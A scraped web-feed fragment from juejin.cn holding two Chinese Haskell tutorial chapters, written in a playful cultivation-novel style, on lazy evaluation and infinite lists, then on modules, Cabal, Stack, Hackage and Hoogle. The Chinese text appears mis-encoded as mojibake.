                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ­å–œé“å‹ï¼ä½ å·²æ­¥å…¥<strong>ç¬¬ä¸ƒç« </strong>ï¼Œè¸å…¥äº†ä¿®ä»™ç•Œæœ€ä¸ºç„å¦™ã€ä¹Ÿæœ€è®©å‡¡é—´ç¨‹åºå‘˜ç™¾æ€ä¸å¾—å…¶è§£çš„å¢ƒç•Œâ€”â€”<strong>ç‚¼è™šæœŸï¼šæƒ°æ€§æ±‚å€¼ï¼ˆLazy Evaluationï¼‰</strong> ã€‚</p>
<p>åœ¨ä¹‹å‰çš„å¢ƒç•Œä¸­ï¼Œä½ å­¦ä¼šäº†å¦‚ä½•æ“æ§å¤æ‚çš„å› æœï¼ˆMonadï¼‰å’Œéš”ç©ºå–ç‰©ï¼ˆApplicativeï¼‰ã€‚ä½†é‚£äº›ä¾ç„¶æ˜¯åœ¨â€œå®å¤„â€ç”¨åŠ›ã€‚è€Œç‚¼è™šæœŸçš„æ ¸å¿ƒï¼Œåœ¨äº**â€œä»¥è™šå¾¡å®ï¼Œéè§ä¸æ˜¾â€**ã€‚</p>
<hr/>
<p>åœ¨å‡¡é—´çš„å‘½ä»¤å¼å®—é—¨ï¼ˆå¦‚ Cã€Javaï¼‰ï¼Œå¼Ÿå­ä»¬è®²ç©¶â€œä»¤è¡Œç¦æ­¢â€ï¼Œè¯´åŠ ä¸€å°±ç«‹åˆ»åŠ ä¸€ã€‚ä½†åœ¨ Haskell çš„é“æ³•ä¸­ï¼Œæˆ‘ä»¬æ¨å´‡**â€œæ— ä¸ºè€Œæ²»â€**ã€‚</p>
<h3 data-id="heading-0">7.1 æ‚Ÿé“ï¼šä»€ä¹ˆæ˜¯æƒ°æ€§ï¼Ÿ</h3>
<p><strong>æƒ°æ€§æ±‚å€¼ï¼ˆLazy Evaluationï¼‰</strong> ï¼Œåˆåâ€œä¸åˆ°é»„æ²³å¿ƒä¸æ­»â€æ±‚å€¼æ³•ã€‚</p>
<ul>
<li><strong>å¿ƒæ³•ï¼š</strong> å½“ä½ å®šä¹‰ä¸€ä¸ªå˜é‡æˆ–å‡½æ•°æ—¶ï¼ŒGHC ç¼–è¯‘å™¨å¹¶ä¸ä¼šç«‹åˆ»å»è®¡ç®—å®ƒï¼Œè€Œæ˜¯å…ˆåœ¨è¯†æµ·ä¸­å°å°ä¸€ä¸ª**â€œè‰ç¨¿â€**ï¼ˆä¸“ä¸šæœ¯è¯­ç§°ä¸º <strong>Thunk</strong>ï¼‰ã€‚</li>
<li><strong>æ˜¾åœ£ï¼š</strong> åªæœ‰å½“è¿™ä¸ªå€¼è¢«é€å¾€â€œæ˜¾åœ£å°â€ï¼ˆæ¯”å¦‚è¦æ‰“å°åˆ°å±å¹•ã€æˆ–è€…å‚ä¸å¿…é¡»çš„é€»è¾‘åˆ¤æ–­ï¼‰æ—¶ï¼Œå°å°æ‰ä¼šè§£å¼€ï¼Œè®¡ç®—æ‰ä¼šå‘ç”Ÿã€‚</li>
</ul>
<blockquote>
<p><strong>æ¯”å–»ï¼š</strong> å‡¡é—´å¼Ÿå­å»é£Ÿå ‚ï¼Œæ˜¯å…ˆæŠŠèœå…¨ç‚’å¥½ï¼ˆStrictï¼‰ï¼›è€Œ Haskell å¼Ÿå­æ˜¯ç­‰å®¢å®˜åä¸‹ï¼ŒæŒ‡ç€èœè°±è¯´â€œæˆ‘è¦åƒé±¼â€ï¼Œåå¨æ‰å¼€å§‹æŠ“é±¼ï¼ˆLazyï¼‰ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">7.2 ç¦å¿Œæ³•æœ¯ï¼šæ— ç©·åºåˆ—ï¼ˆInfinite Listsï¼‰</h3>
<p>å› ä¸ºæœ‰äº†â€œä¸çœ‹ä¸ç®—â€çš„ç‰¹æƒï¼ŒHaskell å¼Ÿå­å¯ä»¥è½»æ˜“è§¦ç¢°å‡¡é—´å®—é—¨çš„ç¦å¿Œâ€”â€”<strong>æ— ç©·</strong>ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼šåŒ…å«æ‰€æœ‰æ­£æ•´æ•°çš„å·è½´</strong></p>
<p>Haskell</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å®šä¹‰ä¸€ä¸ªåŒ…å«ä» 1 åˆ°æ— ç©·å¤§çš„åˆ—è¡¨</span>
allNumbers :: [<span class="hljs-type">Integer</span>]
allNumbers <span class="hljs-operator">=</span> [<span class="hljs-number">1.</span>.] 

<span class="hljs-comment">-- å¦‚æœä½ åœ¨å‡¡é—´è¯­è¨€è¿™ä¹ˆå†™ï¼Œç¬é—´å°±ä¼šå…ƒç¥æ¯ç«­ï¼ˆå†…å­˜æº¢å‡ºï¼‰</span>
<span class="hljs-comment">-- ä½†åœ¨ Haskellï¼Œè¿™åªæ˜¯ä¸€ä¸ªè½»å¦‚é¸¿æ¯›çš„å®šä¹‰</span>
</code></pre>
<p>å¦‚ä½•å–ç”¨ï¼Ÿ</p>
<p>ä½ åªéœ€æˆªå–ä½ éœ€è¦çš„ç‰‡æ®µï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-css" lang="css">take <span class="hljs-number">10</span> allNumbers
-- ç»“æœï¼š<span class="hljs-selector-attr">[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span>
</code></pre>
<p>å½“ä½ ç¥­å‡º <code>take 10</code> æ—¶ï¼Œè™šç©ºæ‰ä¼šä¸ºä½ æ¼”åŒ–å‡ºå‰ 10 ä¸ªæ•°å­—ï¼Œå‰©ä¸‹çš„ä¾ç„¶å¤„äºæ··æ²ŒçŠ¶æ€ã€‚</p>
<hr/>
<h3 data-id="heading-2">7.3 é¡¶çº§ç¥é€šï¼šé€’å½’å®šä¹‰çš„ç»ˆæå½¢æ€</h3>
<p>åˆ©ç”¨æƒ°æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºæå…¶ç„å¦™çš„é€’å½’å®šä¹‰ã€‚æœ€è‘—åçš„ä¾¿æ˜¯é‚£**â€œæ–æ³¢é‚£å¥‘æ— å°½é˜µâ€**ã€‚</p>
<p>Haskell</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">fibs</span> = <span class="hljs-number">0</span> : <span class="hljs-number">1</span> : zipWith (+) fibs (tail fibs)
</code></pre>
<p>è§£å¯†ï¼š</p>
<p>è¿™æ®µä»£ç å°±åƒæ˜¯ä¸€æ¡å’¬ä½è‡ªå·±å°¾å·´çš„è¡”å°¾è›‡ã€‚å®ƒå®šä¹‰è‡ªå·±ä¸ºï¼šå‰ä¸¤ä¸ªæ•°æ˜¯ 0 å’Œ 1ï¼Œåé¢çš„æ•°åˆ™æ˜¯â€œè‡ªå·±â€ä¸â€œè‡ªå·±çš„å°¾å·´â€ç›¸åŠ çš„ç»“æœã€‚å› ä¸ºæ˜¯æƒ°æ€§çš„ï¼Œå®ƒä¼šéšç€ä½ çš„éœ€è¦ï¼Œä¸€èŠ‚ä¸€èŠ‚åœ°å‘åç”Ÿé•¿ã€‚</p>
<hr/>
<h3 data-id="heading-3">7.4 æ¸¡åŠ«è­¦ç¤ºï¼šç§¯å¼Šæˆç–¾ï¼ˆSpace Leaksï¼‰</h3>
<p>ç‚¼è™šæœŸå¹¶éå…¨æ— é£é™©ã€‚å¦‚æœé“å‹åœ¨è¯†æµ·ä¸­å°å°äº†å¤ªå¤šçš„ Thunkï¼ˆè‰ç¨¿ï¼‰å´è¿Ÿè¿Ÿä¸å»è®¡ç®—ï¼Œè¿™äº›è‰ç¨¿ä¼šå †ç§¯å¦‚å±±ï¼Œå ç”¨å¤§é‡çš„å…ƒç¥ï¼ˆå†…å­˜ï¼‰ã€‚è¿™è¢«ç§°ä¸º**â€œç©ºé—´æ³„éœ²â€**ã€‚</p>
<ul>
<li><strong>ç ´åŠ«æ³•é—¨ï¼š</strong> æœ‰æ—¶æˆ‘ä»¬éœ€è¦æ–½å±•â€œæœé­‚æœ¯â€å¼ºåˆ¶å…¶ç«‹åˆ»æ˜¾å½¢ã€‚ä½¿ç”¨ <strong><code>seq</code></strong> å‡½æ•°æˆ–è€… <strong><code>!</code>ï¼ˆStrictness Flagï¼‰</strong> ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨ï¼šâ€œè¿™å·ç»ä¹¦ï¼Œç»™æˆ‘ç«‹åˆ»è¯»å‡ºæ¥ï¼Œä¸å‡†å·æ‡’ï¼â€</li>
</ul>
<hr/>
<h2 data-id="heading-4">ğŸ“œ ç‚¼è™šè¯•ç‚¼ï¼šç¬¬ä¸ƒå…³</h2>
<p>è¯·åœ¨ä½ çš„é¼ç‚‰ä¸­å°è¯•æ“æ§æ— ç©·ï¼š</p>
<ol>
<li>
<p><strong>æ— é™å›å£°ï¼š</strong> ä½¿ç”¨ <code>repeat</code> å‡½æ•°å®šä¹‰ä¸€ä¸ªåŒ…å«æ— é™ä¸ª <code>"çµä¸¹"</code> çš„åˆ—è¡¨ã€‚</p>
</li>
<li>
<p><strong>æˆªå–æ°”è¿ï¼š</strong> ä»è¿™ä¸ªæ— é™åˆ—è¡¨ä¸­å–å‡ºå‰ 7 é¢—çµä¸¹ã€‚</p>
</li>
<li>
<p><strong>ç­›é€‰å› æœï¼š</strong> å®šä¹‰ä¸€ä¸ªåŒ…å«æ‰€æœ‰å¶æ•°çš„æ— é™åˆ—è¡¨ <code>[2, 4, 6..]</code>ï¼Œç„¶åä½¿ç”¨ <code>filter</code> é…åˆ <code>head</code>ï¼Œæ‰¾å‡ºå…¶ä¸­ç¬¬ä¸€ä¸ªå¤§äº 1000 çš„æ•°å­—ã€‚</p>
<ul>
<li><em>æ€è€ƒï¼š</em> ä¸ºä»€ä¹ˆå³ä½¿åˆ—è¡¨æ˜¯æ— é™çš„ï¼Œç¨‹åºä¹Ÿä¸ä¼šå¡æ­»ï¼Ÿ</li>
</ul>
</li>
</ol>
<p><strong>â€œå½“ä½ èƒ½å®‰ç„¶ååœ¨æ— é™çš„è™šç©ºä¹‹ä¸Šï¼Œåªæ‹¨åŠ¨ä½ éœ€è¦çš„é‚£ä¸€æ ¹å› æœå¼¦æ—¶ï¼Œä½ çš„ç‚¼è™šæœŸä¾¿å·²å¤§åœ†æ»¡ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> ç‚¼è™šä¹‹åï¼Œéœ€<strong>åˆä½“</strong>ã€‚æˆ‘ä»¬å°†å­¦ä¹ <strong>æ¨¡å—åŒ–ä¸åŒ…ç®¡ç†ï¼ˆModules &amp; Cabalï¼‰</strong> ã€‚ä½ å°†èµ°å‡ºé—­å…³çš„æ´åºœï¼Œå­¦ä¹ å¦‚ä½•å€Ÿç”¨åƒä¸‡é“å‹ç•™ä¸‹çš„â€œè—ç»é˜â€ï¼ˆHackageï¼‰ï¼Œæ„å»ºçœŸæ­£çš„ç»ä¸–æ³•é˜µã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬å…«ç« ï¼šä¸‡æµå½’å®—ä¸å¼€å®—ç«‹æ´¾]]></title>    <link>https://juejin.cn/post/7589181008098967567</link>    <guid>https://juejin.cn/post/7589181008098967567</guid>    <pubDate>2025-12-30T02:45:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589181008098967567" data-draft-id="7589181008098951183" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬å…«ç« ï¼šä¸‡æµå½’å®—ä¸å¼€å®—ç«‹æ´¾"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:45:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬å…«ç« ï¼šä¸‡æµå½’å®—ä¸å¼€å®—ç«‹æ´¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:45:19.000Z" title="Tue Dec 30 2025 02:45:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ¬¢è¿é“å‹æ¥åˆ°<strong>ç¬¬å…«ç« </strong>ã€‚</p>
<p>ç»è¿‡â€œç‚¼è™šæœŸâ€å¯¹æ— é™ä¸æƒ°æ€§çš„æ„Ÿæ‚Ÿï¼Œä½ å·²ç»èƒ½å¤Ÿåœ¨é‚£è™šæ— ç¼¥ç¼ˆçš„ Thunk ä¸­æ•æ‰çœŸç†ã€‚ç„¶è€Œï¼Œä¸€ä¸ªäººçš„ä¿®è¡Œç»ˆç©¶æ˜¯å­¤ç‹¬çš„ã€‚æƒ³è¦ç‚¼åˆ¶å‡ºéœ‡åŠ¨ä¹å¤©çš„â€œç»ä¸–ä»™é˜µâ€ï¼ˆå¤§å‹å·¥ç¨‹ï¼‰ï¼Œä½ ä¸èƒ½å‡¡äº‹éƒ½äº²åŠ›äº²ä¸ºã€‚</p>
<p>ä»Šæ—¥ï¼Œæˆ‘ä»¬è¦è¿ˆå…¥<strong>åˆä½“æœŸï¼šä¸‡æµå½’å®—ï¼ˆModules &amp; Ecosystemï¼‰</strong> ã€‚åœ¨è¿™ä¸€å±‚å¢ƒç•Œï¼Œä½ å°†å­¦ä¼šå¦‚ä½•å¼€è¾Ÿè‡ªå·±çš„â€œæ´åºœåˆ†é™¢â€ï¼Œå¹¶å­¦ä¼šå€Ÿç”¨ä¸‡åƒé“å‹ç•™åœ¨**â€œè—ç»é˜ï¼ˆHackageï¼‰â€**ä¸­çš„é€šå¤©ç§˜å®ã€‚</p>
<hr/>
<p>åœ¨ä¿®ä»™ç•Œï¼ŒçœŸæ­£çš„å¼ºè€…ä»ä¸è‡ªå·±æ‰‹åŠ¨å®ç°æ¯ä¸€ä¸ªå“ˆå¸Œè¡¨æˆ–è§£æå™¨ã€‚ä»–ä»¬æ‡‚å¾—ç¥­å‡º**â€œå¬å”¤æœ¯â€**ï¼Œå°†å‰äººçš„é“æœåŒ–ä¸ºå·±ç”¨ã€‚</p>
<h3 data-id="heading-0">8.1 æ´åºœåˆ†åŒ–ï¼šModuleï¼ˆæ¨¡å—ç³»ç»Ÿï¼‰</h3>
<p>éšç€ä½ çš„æ³•æœ¯ï¼ˆä»£ç ï¼‰è¶Šæ¥è¶Šå¤šï¼Œå¦‚æœå †åœ¨ä¸€ä¸ªå·è½´é‡Œï¼Œéš¾å…ä¼šäº§ç”Ÿ**â€œçµæ°”å†²çªâ€**ã€‚ä½ éœ€è¦å°†å®ƒä»¬æ‹†åˆ†åˆ°ä¸åŒçš„å³°å¤´ã€‚</p>
<ul>
<li><strong>å®šä¹‰å³°å¤´ï¼š</strong></li>
</ul>
<p>Haskell</p>
<pre><code class="hljs language-rust" lang="rust">module LingXian.<span class="hljs-title function_ invoke__">Alchemy</span> (ç…‰ä¸¹æœ¯, ç‚¸ç‚‰) <span class="hljs-keyword">where</span>

ç…‰ä¸¹æœ¯ :: Material <span class="hljs-punctuation">-&gt;</span> Pill
ç…‰ä¸¹æœ¯ = ...

ç‚¸ç‚‰ :: <span class="hljs-type">String</span>
ç‚¸ç‚‰ = <span class="hljs-string">"ç °ï¼"</span>
</code></pre>
<ul>
<li>
<p>å¼•å…¥ä¼ æ‰¿ï¼š</p>
<p>å½“ä½ åœ¨ä¸»å³°ä¿®è¡Œæ—¶ï¼Œåªéœ€ä¸€çº¸æ–‡ä¹¦ä¾¿å¯è°ƒç”¨ï¼š</p>
</li>
</ul>
<p>Haskell</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> LingXian.<span class="hljs-built_in">Alchemy</span> (ç…‰ä¸¹æœ¯) -- åªå–æ‰€éœ€ï¼Œä¸æ²¾å› æœ
</code></pre>
<hr/>
<h3 data-id="heading-1">8.2 é•‡å®—ç¥å…½ï¼šCabal ä¸ Stack</h3>
<p>åœ¨å‡¡é—´ï¼Œç®¡ç†ä¾èµ–æ˜¯ä¸€ä»¶è‹¦å·®äº‹ã€‚è€Œåœ¨ Î» é—¨ï¼Œæˆ‘ä»¬æœ‰ä¸¤å¤´ç¥å…½å®ˆæŠ¤ç€å®—é—¨çš„ç§©åºï¼š<strong>Cabal</strong> ä¸ <strong>Stack</strong>ã€‚å®ƒä»¬è´Ÿè´£ç¡®ä¿ä½ å¼•å…¥çš„æ³•å®ä¹‹é—´ä¸ä¼šäº§ç”Ÿâ€œå±æ€§ç›¸å…‹â€ï¼ˆç‰ˆæœ¬å†²çªï¼‰ã€‚</p>
<ul>
<li><strong>Cabalï¼š</strong> å¤è€çš„æŠ¤æ³•ç¥ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œèƒ½å¤„ç†æœ€å¤æ‚çš„å› æœé“¾æ¡ã€‚</li>
<li><strong>Stackï¼š</strong> åèµ·ä¹‹ç§€ï¼Œä¸»æ‰“â€œç¨³å®šâ€ã€‚å®ƒä¼šä¸ºä½ é€‰å®šä¸€ä¸ªç‰¹å®šçš„â€œä¿®ä»™çºªå…ƒâ€ï¼ˆResolverï¼‰ï¼Œç¡®ä¿åœ¨è¯¥çºªå…ƒä¸‹çš„æ‰€æœ‰æ³•å®éƒ½èƒ½å®Œç¾å¥‘åˆã€‚</li>
</ul>
<blockquote>
<p><strong>å¿ƒæ³•ï¼š</strong> <code>stack build</code> ä¸€å‡ºï¼Œå¤©åœ°çµæ°”è‡ªåŠ¨æ±‡èšï¼Œæ‰€æœ‰ä¾èµ–è‡ªåŠ¨å½’ä½ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">8.3 è—ç»é˜ï¼šHackage ä¸ Hoogle</h3>
<ul>
<li>
<p><strong>Hackageï¼š</strong> è¿™æ˜¯ Î» é—¨çš„å…¬å…±è—ç»é˜ï¼Œé‡Œé¢å­˜æ”¾ç€æ•°ä»¥ä¸‡è®¡çš„åº“ã€‚æ— è®ºæ˜¯å¤„ç†æ–‡å­—ã€å›¾å½¢è¿˜æ˜¯é«˜ç»´æ•°å­¦ï¼Œè¿™é‡Œéƒ½æœ‰é“å‹ç•™ä¸‹çš„ç§˜ç±ã€‚</p>
</li>
<li>
<p><strong>Hoogleï¼ˆç¥è¯†æœç´¢ï¼‰ï¼š</strong> è¿™æ˜¯ä¿®ä»™ç•Œæœ€ç¥å¥‡çš„æœç´¢å¼•æ“ã€‚ä½ ä¸ä»…å¯ä»¥ç”¨åå­—æœï¼Œè¿˜å¯ä»¥ç”¨**â€œæ³•æœ¯ç­¾åâ€**æœã€‚</p>
<ul>
<li><em>ç¤ºä¾‹ï¼š</em> ä½ æƒ³æ‰¾ä¸€ä¸ªâ€œèƒ½æŠŠåˆ—è¡¨åè½¬â€çš„æ³•æœ¯ï¼Œåªéœ€åœ¨ Hoogle è¾“å…¥ <code>[a] -&gt; [a]</code>ï¼Œå®ƒä¾¿ä¼šå‘Šè¯‰ä½ é‚£å« <code>reverse</code>ã€‚</li>
</ul>
</li>
</ul>
<hr/>
